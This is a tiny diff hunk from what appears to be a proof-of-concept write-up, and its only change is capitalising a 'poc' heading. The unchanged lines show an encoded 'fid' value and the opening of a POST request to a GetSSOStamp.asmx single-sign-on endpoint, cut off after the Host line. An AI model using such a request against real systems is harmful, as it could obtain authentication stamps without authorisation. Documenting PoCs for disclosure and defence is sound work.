@@ -5,7 +5,7 @@
 fid="/yV4r5PdARKT4jaqLjJYqw=="
 ```
 
-## poc
+## POC
 ```
 POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
 Host: x
